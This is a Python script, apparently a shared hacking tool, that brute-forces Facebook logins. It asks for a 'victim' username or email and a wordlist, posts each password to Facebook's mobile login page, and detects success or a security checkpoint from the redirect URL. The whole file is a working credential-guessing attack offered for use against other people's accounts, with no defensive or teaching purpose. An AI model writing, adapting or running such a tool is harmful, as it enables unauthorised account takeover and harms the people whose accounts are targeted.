#!/usr/bin/python3

import requests, sys

if sys.platform in ["linux", "linux2"]:
        w = "\033[0m"
        r = "\033[31;1m"
        g = "\033[32;1m"
        y = "\033[33;1m"
        b = "\033[34;1m"
        p = "\033[35;1m"
        c = "\033[36;1m"

else:
        w = ""
        r = ""
        g = ""
        y = ""
        b = ""
        p = ""
        c = ""

logo = """%s
 _       _____________            %s0000%s
| \_____|  %sBRUTE %sv.1%s  \___       %s0%s
| |_____||     |     ||___>---- %s0000%s
|_/     ||_|_|_|_|_|_|/          %s0%s
                                 %s0%s
==============[ %sinfo%s ]================
author : %smr.4fun%s
github : %sgithub.com/mrforfun%s
team   : to%sX%ssec
code   : %spython%s
======================================
"""%(w,b,w,r,g,w,b,w,b,w,b,w,b,w,g,w,r,w,y,w,r,w,g,w)

def brute(id,pw):
	link = "https://m.facebook.com/login.php"
	data = {"email":id, "pass":pw}
	r = requests.post(link, data=data)
	if "m_sess" in r.url or "save-device" in r.url:
		print("[ %sfound%s ] password found : %s"%(r,w,g) + pw)
		print("%s"%(w))
		exit()
	elif "checkpoint" in r.url:
		print("%s[ %swarning%s ] passwordd found checkpoint : %s"%(w,y,w,g) + pw)
		print("%s"%(w))
		exit()
	else:
		print("%s[ %sinfo%s ] failed password : "%(w,b,w) + pw)


def list(id,pw):
	o = open(pw, "r").readlines()
	for i in o:
		brute(id,i.strip())

if __name__ == "__main__":
	if sys.version[0] in "3":
		next
	else:
		print("%s[ %sinfo%s ] Please use python version 3.* "%(w,b,w))
		exit()

	print(logo)
	id = input("%s[ %sinput%s ] victim id,username or email : "%(w,c,w))
	print("[%s?%s] use %s..%s for %sback%s storage ex: %s../desktop/word.txt%s"%(g,w,g,w,r,w,g,w))
	pw = input("%s[ %sinput%s ] word list : "%(w,c,w))
	o = open(pw, "r").readlines()
	print("[%s*%s] cracking account : %s"%(r,w,g) + id)
	print("%s[%s*%s] loaded %s%s%s password"%(w,y,w,g,len(o),w))
	list(id,pw)
